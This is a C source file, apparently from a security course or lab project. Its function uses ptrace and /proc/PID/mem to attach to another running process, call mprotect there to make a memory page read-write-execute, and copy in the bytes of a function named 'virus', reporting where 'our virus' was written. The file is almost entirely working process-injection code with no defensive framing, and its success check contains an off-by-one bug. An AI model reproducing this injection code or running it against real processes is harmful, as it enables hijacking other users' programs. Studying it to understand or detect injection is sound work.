#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include "headers.h"
#include <sys/mman.h>

void step6(char **argv, char *pid, long funcAddr, int pagesize){
  void *begAddrVirus=virus;
  char *length;
  FILE *fp;
  const int pidTracee = atoi(pid);
  char *buffer = malloc(sizeof(char) * MALLOC_SIZE);
  char * command = malloc(sizeof(char) * (strlen("nm -S -t d tracer")));
  sprintf(command, "nm -S -t d tracer");
  fp = popen(command, "r");
  if (fp == NULL) {
    exit(EXIT_FAILURE);
  }
  while	(fgets(buffer, MALLOC_SIZE, fp) != NULL) {
    if (strstr(buffer, "virus") != NULL) {
      strtok(buffer, " ");
      length = strtok(NULL, " ");
      break;
    }
  }
  printf("ADDRESSBEG:%p\n", begAddrVirus);
  printf("LENGTH: %s\n", length);
  pclose (fp);

  char *AddrLibcTracee;
  char *AddrLibcTracer;
  long memalignRes = step5(argv, pid, funcAddr, pagesize, &AddrLibcTracee, &AddrLibcTracer);

  long Addrmprotect = strtol(AddrLibcTracee, NULL, 16);
  Addrmprotect -= +strtol(AddrLibcTracer, NULL, 16);
  Addrmprotect += (long)mprotect;


  
  struct user_regs_struct regs;
  struct user_regs_struct backup;

  char *memory = malloc(sizeof(char) * 3);
  unsigned char breakpointTrap = 0XCC;


  if (ptrace(PTRACE_ATTACH, pidTracee, 0,0) < 0){
    perror("ATTACH ERROR");
    exit(1);
  }
  command = malloc(sizeof(char) * 128);
  if (waitpid(pidTracee, NULL, 0) != pidTracee){
    perror("WAITPID");
  }

  sprintf(command, "/proc/%d/mem",pidTracee);
  if ((fp = fopen(command, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }

  fseek(fp, funcAddr, SEEK_SET);
  fread(&memory, 3, 1, fp);

  fseek(fp, funcAddr, SEEK_SET);

  if ((fwrite(&breakpointTrap, 1,1, fp)) != 1) {
    perror("FWRITE");
    }

  if (fclose(fp) != 0) {
    perror("FCLOSE");
  }

  if (ptrace(PTRACE_CONT, pidTracee, NULL,NULL) < 0) {
    perror("ERROR CONT");
  }
  if (waitpid(pidTracee, NULL,0) != pidTracee){
    perror("WAITPID");
  }
  if ((fp = fopen(command, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }


  ptrace(PTRACE_GETREGS, pidTracee, NULL, &regs);
  ptrace(PTRACE_GETREGS, pidTracee, NULL, &backup);
  regs.rip = funcAddr;
  regs.rax = Addrmprotect;

  long tempmemalignRes = memalignRes;
  memalignRes = memalignRes & ~(pagesize-1);
  regs.rdi = memalignRes;//ADDR TO APPLY CHANGE;  
  printf("\nmprotect Arguments: \n First:%lx\n Second:%d\n Third:WRITE|READ|EXEC\n", memalignRes, pagesize);
  regs.rsi = pagesize;//length;//LENGTH TO MAKE EXECUTABLE;
  regs.rdx = PROT_EXEC | PROT_WRITE | PROT_READ ;//PROT_WRITE;
  unsigned char test[] = {0xFF, 0xD0, 0xCC};

   fseek(fp, funcAddr, SEEK_SET);
  if (fwrite(&test, 3, 1, fp) <= 0){
    perror("FWRITE");
  }
  ptrace(PTRACE_SETREGS, pidTracee, &regs, &regs);

  
  if (fclose(fp) != 0) {
    perror("FCLOSE");
  }

  if (ptrace(PTRACE_CONT, pidTracee, NULL,NULL) < 0) {
    perror("ERROR CONT");
  }

  int wstatus;
  if (waitpid(pidTracee, &wstatus,0) != pidTracee){
    perror("WAITPID");
  }

  ptrace(PTRACE_GETREGS, pidTracee, NULL, &regs);
  printf("memprotect Return: %lld", regs.rax);


  if ((fp = fopen(command, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }

  fseek(fp, funcAddr, SEEK_SET);
  if (fwrite(&memory, 3,1,fp) != 1) {
    perror("FWRITE");
  }


  ptrace(PTRACE_SETREGS, pidTracee, NULL, &backup);

  if (fclose(fp) != 0) {
    perror("FCLOSE");
  }

  if (ptrace(PTRACE_DETACH, pidTracee, NULL, NULL) < 0) {
    perror("PTRACE_DETACH");
  }

  //  printf("\nPrinting result of posix_memalign:\n");
  //printf(" regs.rdi: %llx\n Return Value: %lld\n", regs.rdi, regs.rax); 



  //WRITE CODE TO MEMORY;
  //FIRST GET CODE FROM VIRUS
  
  unsigned char *toWrite;
  unsigned char *backupvirus;
  char *toOpen;
  int intLength = atoi(length);
  toWrite = malloc(sizeof(char)* intLength + 1);
  backupvirus = malloc(sizeof(char) * intLength +1);
  toOpen = malloc(sizeof(char) * (strlen("/proc//mem") + 50)); //TOCHANGE 5 to strlen pid
  sprintf(toOpen, "/proc/%d/mem",getpid());
  if ((fp = fopen(toOpen, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }
  fseek(fp, (long)virus, SEEK_SET);
  int readsize;
  if (readsize = fread(toWrite, intLength, 1, fp) != 1){
      perror("READ:");
  }

  if (fclose(fp) != 0) {
    perror("FCLOSE");
  }
  
    //THEN WRITE THAT CODE TO THE MEMORY OF TRACEE  
  toOpen = malloc(sizeof(char) * (strlen("/proc//mem") + strlen(pid)));
  sprintf(toOpen, "/proc/%s/mem",pid);

  if ((fp = fopen(toOpen, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }


  if (ptrace(PTRACE_ATTACH, pidTracee, 0,0) < 0){
    perror("ATTACH ERROR");
    exit(1);
  }
  if (waitpid(pidTracee, NULL, 0) != pidTracee){
    perror("WAITPID");
  }

    
  toOpen = malloc(sizeof(char) * (strlen("/proc//mem") + strlen(pid)));  
  sprintf(toOpen, "/proc/%s/mem",pid);
  

  if ((fp = fopen(toOpen, "r+")) == NULL){
    perror("exit failure on fp");
    exit(EXIT_FAILURE);
  }
  fseek(fp, tempmemalignRes, SEEK_SET);
  fwrite(toWrite, intLength, 1, fp);
  if(toWrite == NULL) {
    printf("NULL");
    fflush(0);
  }
  
  fseek(fp, tempmemalignRes, SEEK_SET);
  fread(backupvirus, intLength, 1, fp);

  int faillure = -1;
  for (int i = 0; i < intLength; i++) {
    if (toWrite[i] != backupvirus[i]) {
      faillure++;
    }
  }
  printf("\nWrote our virus at:%lx\n", tempmemalignRes);
  if (faillure == 0) {
    printf("Writting failled\n");
  }
  else {
    printf("Writing successful\n");
  }
  
  if (ptrace(PTRACE_DETACH, pidTracee, NULL, NULL) < 0) {
    perror("PTRACE_DETACH");
  }
}
